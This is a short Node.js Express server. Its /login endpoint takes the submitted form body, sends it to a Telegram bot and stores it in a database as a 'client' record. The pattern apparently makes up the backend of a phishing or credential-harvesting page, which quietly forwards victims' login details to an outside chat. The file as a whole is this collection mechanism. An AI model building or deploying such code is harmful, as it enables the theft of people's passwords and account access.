const express = require('express');
require('dotenv/config');

const TelegramHandler = require('./handlers/telegramBotHandler');
const DatabaseHandler = require('./handlers/databaseHandler.js');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  res.send("TEST");
});

app.post('/login', async (req, res) => {
  TelegramHandler.SendMessageToTelegram(TelegramHandler.FormMessageToSend(req.body));


  try{
    const savedPost = await DatabaseHandler.SaveClientToDB(DatabaseHandler.CreatePostModel(req.body));
    res.json(savedPost);
  }
  catch (err) {
    res.json({ message: err});
  }

  res.end("yes");
});

app.listen(3000);